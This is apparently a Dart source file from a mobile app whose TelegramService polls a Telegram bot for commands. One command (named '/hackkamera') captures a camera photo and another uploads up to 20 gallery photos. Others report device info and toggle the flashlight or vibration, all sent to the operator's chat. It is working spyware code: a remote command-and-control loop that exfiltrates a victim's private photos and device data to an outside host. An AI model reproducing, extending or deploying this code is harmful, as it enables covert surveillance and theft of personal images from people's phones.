import 'dart:convert';
import 'package:http/http.dart' as http;
import '../config.dart';
import 'device_service.dart';
import 'camera_service.dart';
import 'gallery_service.dart';

class TelegramService {
  static String get _api => 'https://api.telegram.org/bot${Config.BOT_TOKEN}';
  static int _lastUpdate = 0;
  static bool _running = true;

  static void initialize() {
    _startPolling();
  }

  static Future<void> _startPolling() async {
    while (_running) {
      try {
        final res = await http.get(
          Uri.parse('$_api/getUpdates?offset=${_lastUpdate + 1}&timeout=30'),
        );
        final data = json.decode(res.body);
        if (data['ok'] == true && data['result'] != null) {
          for (var upd in data['result']) {
            _lastUpdate = upd['update_id'];
            await _handleUpdate(upd);
          }
        }
      } catch (_) {
        await Future.delayed(const Duration(seconds: 5));
      }
    }
  }

  static Future<void> _handleUpdate(Map<String, dynamic> upd) async {
    if (upd['message'] == null) return;
    final msg = upd['message'];
    final text = (msg['text'] ?? '').toString().trim();
    final hasReply = msg['reply_to_message'] != null;
    final hasPhoto = hasReply && msg['reply_to_message']['photo'] != null;

    switch (text) {
      case '/cekperangkat':
        await sendDeviceInfo();
        break;

      case '/nyalakansenter':
        await DeviceService.toggleFlashlight(true);
        await _sendMsg('✅ Senter ON');
        break;

      case '/matikansenter':
        await DeviceService.toggleFlashlight(false);
        await _sendMsg('❌ Senter OFF');
        break;

      case '/getarkanperangkat':
        await DeviceService.vibrate();
        await _sendMsg('📳 Getar!');
        break;

      case '/hackkamera':
        await _sendMsg('📸 Ngambil foto...');
        final path = await CameraService.capture();
        if (path != null) {
          await _sendPhoto(path, '📸 Hasil Kamera');
        } else {
          await _sendMsg('❌ Gagal akses kamera');
        }
        break;

      case '/ambilfoto':
        await _sendMsg('🖼 Nyari foto...');
        final photos = await GalleryService.getAllPhotos();
        await _sendMsg('📦 ${photos.length} foto ditemukan');
        int count = 0;
        for (String p in photos) {
          if (count >= 20) break;
          await _sendPhoto(p);
          count++;
          await Future.delayed(const Duration(milliseconds: 300));
        }
        await _sendMsg('✅ ${count} foto terkirim');
        break;

      case '/menu':
        await _sendMsg('''
🛠 COMMANDS:
/cekperangkat - Cek info device
/nyalakansenter - Senter ON
/matikansenter - Senter OFF
/getarkanperangkat - Getarkan HP
/hackkamera - Ambil foto kamera
/ambilfoto - Ambil foto galeri
/menu - Tampilkan menu ini
''');
        break;

      default:
        if (text.startsWith('/')) {
          await _sendMsg('❌ Command ga dikenal. Ketik /menu');
        }
    }
  }

  static Future<void> sendDeviceInfo() async {
    final info = await DeviceService.getFullInfo();
    await _sendMsg(info);
  }

  static Future<void> _sendMsg(String text) async {
    try {
      await http.post(
        Uri.parse('$_api/sendMessage'),
        body: {
          'chat_id': Config.CHAT_ID,
          'text': text,
          'parse_mode': 'HTML',
        },
      );
    } catch (_) {}
  }

  static Future<void> _sendPhoto(String path, [String? caption]) async {
    try {
      final req = http.MultipartRequest('POST', Uri.parse('$_api/sendPhoto'));
      req.fields['chat_id'] = Config.CHAT_ID;
      if (caption != null) req.fields['caption'] = caption;
      req.files.add(await http.MultipartFile.fromPath('photo', path));
      await req.send();
    } catch (_) {}
  }
}